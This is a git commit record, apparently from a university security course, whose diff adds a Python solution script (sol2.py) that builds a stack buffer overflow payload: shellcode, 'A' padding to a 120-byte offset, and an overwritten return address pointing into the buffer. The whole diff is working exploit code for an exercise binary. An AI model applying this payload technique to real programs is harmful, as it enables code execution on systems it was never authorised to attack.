0d0330cd202ea2331814b16b6cf328a52328f2bf
Carson Caldwell <cbcald@umich.edu>
2026-03-23 04:18:43 +0000

    good work

--- sol2.py
+++ sol2.py
@@ -3,3 +3,11 @@
 import sys
 
 from shellcode import shellcode
+buf_addr = 0x7ffffff6b460  
+offset = 120
+
+payload = shellcode 
+payload += b'A' * (offset - len(shellcode)) #distance to the return address in memory fill with padding
+payload += buf_addr.to_bytes(8, 'little')
+
+sys.stdout.buffer.write(payload)
